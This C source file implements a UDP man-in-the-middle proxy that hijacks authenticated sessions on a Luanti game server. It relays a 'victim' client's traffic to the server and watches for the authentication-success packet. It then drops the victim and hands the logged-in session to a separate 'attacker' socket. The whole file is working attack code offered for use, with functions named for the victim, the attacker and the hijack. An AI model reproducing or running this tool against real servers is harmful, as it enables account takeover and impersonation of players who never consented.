#include "proxy.h"

#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>

#define BUFFER_SITZE 0xFFFF
bool manualdrop = false;

void  INThandler(int sig) {
    if (manualdrop) {
        exit(2);
    }
    puts("WARNING: IF YOU PRESS CTL-C AGAIN, YOU TERMINATE THE PROGRAM! (Now you have just requested dropping the victim's connection manually.)");
    manualdrop = true;
}

bool detect_auth_ok(uint8_t* bytes, size_t length) {
    if (length < 13) {
        return false;
    }
    return bytes[12] == 0x52;
}

bool wait_and_auth(proxy* prox) {
    signal(SIGINT, INThandler);    uint8_t buff[BUFFER_SITZE];
    ssize_t bufflen;

    prox->listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if ( bind(prox->listen_fd, (const struct sockaddr *)&prox->listen_addr,  
            sizeof(prox->listen_addr)) < 0 ) 
    {
        perror("victim bind failed"); 
        exit(EXIT_FAILURE); 
    }

    prox->attacker_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if ( bind(prox->attacker_fd, (const struct sockaddr *)&prox->attacker_addr,  
            sizeof(prox->attacker_addr)) < 0 ) 
    {
        perror("attacker bind failed"); 
        exit(EXIT_FAILURE); 
    }


    int len = sizeof(prox->listen_client);

    // getting attacker to send packets to.
    recvfrom(prox->attacker_fd, buff, BUFFER_SITZE,
        0, (struct sockaddr*) &prox->attacker_client,
        &len
    );

    bufflen = recvfrom(prox->listen_fd, buff, BUFFER_SITZE,  
                0, ( struct sockaddr *) &prox->listen_client, 
                &len);


    prox->server_fd = socket(AF_INET, SOCK_DGRAM, 0);
    connect(prox->server_fd, (struct sockaddr*) &prox->luanti_server, sizeof(prox->luanti_server));
    send(prox->server_fd, buff, bufflen, 0);

    while(1) {
        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SITZE, MSG_DONTWAIT);
        if (bufflen > 0) {
            sendto(prox->attacker_fd, buff, bufflen, 0, (struct sockaddr*)&prox->attacker_client, sizeof(prox->attacker_client));
            sendto(prox->listen_fd, buff, bufflen, 0, (struct sockaddr*)&prox->listen_client, sizeof(prox->listen_client));
        }

        bufflen = recvfrom(prox->listen_fd, (uint8_t *)buff, BUFFER_SITZE,  
            MSG_DONTWAIT, ( struct sockaddr *) &prox->listen_client, 
            &len);

        if (bufflen > 0) {
            send(prox->server_fd, buff, bufflen, 0);
            if (detect_auth_ok(buff, bufflen) || manualdrop) {
                puts("dropping the victim's connection!");
                return true;
            }
        }
    }

    return true;
}

void proxy_init(proxy* prox, proxy_args* args) {
    memset(prox, 0, sizeof(proxy));

    prox->luanti_server.sin_family = AF_INET;
    struct hostent *host = NULL;
    host = gethostbyname(args->address);
    if (host == NULL) {
        perror("Failed looking up the IP-Address of the Server!");
        exit(EXIT_FAILURE);
    }
    prox->luanti_server.sin_addr.s_addr = *(long *) host->h_addr_list[0];
    prox->luanti_server.sin_port = htons(args->address_port);

    prox->listen_addr.sin_family = AF_INET;
    prox->listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    prox->listen_addr.sin_port = htons(args->victim_port);

    prox->attacker_addr.sin_family = AF_INET;
    prox->attacker_addr.sin_addr.s_addr = INADDR_ANY;
    prox->attacker_addr.sin_port = htons(args->attacker_port);
}

void proxy_run_hijack(proxy* prox) {
    close(prox->listen_fd);
    uint8_t buff[BUFFER_SITZE];
    ssize_t bufflen;
    int len = sizeof(prox->listen_client);

    while(1) {
        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SITZE, MSG_DONTWAIT);
        if (bufflen > 0) {
            sendto(prox->attacker_fd, buff, bufflen, 0, (struct sockaddr*)&prox->attacker_client, sizeof(prox->attacker_client));
        }

        bufflen = recvfrom(prox->attacker_fd, (uint8_t *)buff, BUFFER_SITZE,  
            MSG_DONTWAIT, ( struct sockaddr *) &prox->attacker_client, 
            &len);

        if (bufflen > 0) {
            send(prox->server_fd, buff, bufflen, 0);
        }
    }
}